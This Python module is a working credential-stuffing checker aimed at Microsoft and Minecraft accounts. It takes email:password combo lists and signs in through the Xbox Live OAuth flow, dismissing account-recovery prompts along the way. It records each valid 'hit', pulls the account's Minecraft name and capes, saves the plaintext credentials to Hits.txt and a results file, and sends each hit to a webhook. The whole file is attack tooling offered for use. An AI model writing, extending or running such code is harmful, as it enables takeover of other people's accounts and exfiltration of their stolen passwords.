import requests, re, os, time, threading, random, urllib3, warnings, uuid, socket, socks, sys
from datetime import datetime, timezone
from colorama import Fore
from urllib.parse import urlparse, parse_qs
from io import StringIO

sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"

urllib3.disable_warnings()
warnings.filterwarnings("ignore")

class Config:
    def __init__(self):
        self.data = {
            'optifinecape': True,
            'access': False,
            'namechange': True,
            'lastchanged': True
        }

    def set(self, key, value):
        self.data[key] = value

    def get(self, key):
        return self.data.get(key, None)

config = Config()

def get_urlPost_sFTTag(session):
    try:
        text = session.get(sFTTag_url, timeout=15).text
        match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
        if match:
            sFTTag = match.group(1)
            match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
            if match:
                return match.group(1), sFTTag, session
    except Exception:
        pass
    return None, None, session

def get_xbox_rps(session, email, password, urlPost, sFTTag):
    try:
        data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
        login_request = session.post(urlPost, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=15)
        
        if '#' in login_request.url and login_request.url != sFTTag_url:
            fragment_data = parse_qs(urlparse(login_request.url).fragment)
            token = fragment_data.get('access_token', ["None"])[0]
            session.xbl_hash = fragment_data.get('uhs', ["None"])[0]
            
            if token != "None":
                return token, session
                
        elif 'cancel?mkt=' in login_request.text:
            data = {
                'ipt': re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
                'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
                'uaid': re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
            }
            ret = session.post(re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group(), data=data, allow_redirects=True)
            fin = session.get(re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group(), allow_redirects=True)
            
            fragment_data = parse_qs(urlparse(fin.url).fragment)
            token = fragment_data.get('access_token', ["None"])[0]
            session.xbl_hash = fragment_data.get('uhs', ["None"])[0]
            
            if token != "None":
                return token, session
    except:
        pass
    return "None", session

# --- MAIN RUN FUNCTION CALLED BY app.py ---
def run(input_path, output_path, user_webhook=None):
    res_dir = os.path.dirname(output_path)
    os.makedirs(res_dir, exist_ok=True)
    
    if not os.path.exists(input_path):
        return

    with open(input_path, 'r', encoding='utf-8', errors='replace') as f:
        lines = [line.strip() for line in f if line.strip()]

    hits_list = []
    bad_list = []
    capture_list = []

    for line in lines:
        if ":" not in line:
            continue
        parts = line.strip().split(":", 1)
        email = parts[0]
        password = parts[1]
        
        print(f"[*] Trying account: {email}")
        
        session = requests.Session()
        urlPost, sFTTag, session = get_urlPost_sFTTag(session)
        if not urlPost or not sFTTag:
            print("[-] Failed to get urlPost or sFTTag (Bad)")
            bad_list.append(line)
            continue
        
        token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
        if token == "None":
            print("[-] Microsoft login failed (Bad Password or Blocked).")
            bad_list.append(line)
            continue
        
        print("[+] SUCCESS! Valid Microsoft Account Found (Hit)!")
        hits_list.append(line)
        
        name = "Minecraft Account"
        cape_list = "None"
        try:
            r = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {token}'}, verify=False, timeout=5)
            if r.status_code == 200:
                data = r.json()
                name = data.get("name", "Minecraft Account")
                found_capes = [c.get("alias", "") for c in data.get("capes", [])]
                if found_capes:
                    cape_list = ", ".join(found_capes)
        except:
            pass
        
        cap_block = f"Email: {email}\nPassword: {password}\nName: {name}\nCapes: {cape_list}\nAccount Type: Minecraft Java\n============================\n"
        capture_list.append(cap_block)

        # --- CLEAN DUAL WEBHOOK NOTIFICATION TRIGGER ---
        try:
            from app import send_hit_notification
            send_hit_notification(
                email=email,
                password=password,
                account_type="Minecraft Java",
                capes=cape_list,
                user_webhook_url=user_webhook
            )
        except Exception as e:
            print(f"[ERROR] Failed to trigger webhook notification: {e}")

    # Save individual Hits.txt for counting
    hits_file_path = os.path.join(res_dir, "Hits.txt")
    with open(hits_file_path, 'w', encoding='utf-8') as h_file:
        h_file.write("\n".join(hits_list) + ("\n" if hits_list else ""))

    # --- STRUCTURED RESULTS.TXT FORMAT (UTF-8 Encoding Fixed) ---
    final_output = []
    
    final_output.append("=== HITS [+] ===\n")
    if hits_list:
        final_output.extend([f"{h}\n" for h in hits_list])
    else:
        final_output.append("No hits found.\n")
    
    final_output.append("\n=== BAD [-] ===\n")
    if bad_list:
        final_output.extend([f"{b}\n" for b in bad_list])
    else:
        final_output.append("No bad combos.\n")
        
    final_output.append("\n=== CAPTURES ===\n")
    if capture_list:
        final_output.extend(capture_list)
    else:
        final_output.append("No captures available.\n")

    # Ensure encoding is explicitly set to utf-8 so emojis don't break
    with open(output_path, 'w', encoding='utf-8', errors='replace') as out:
        out.writelines(final_output)

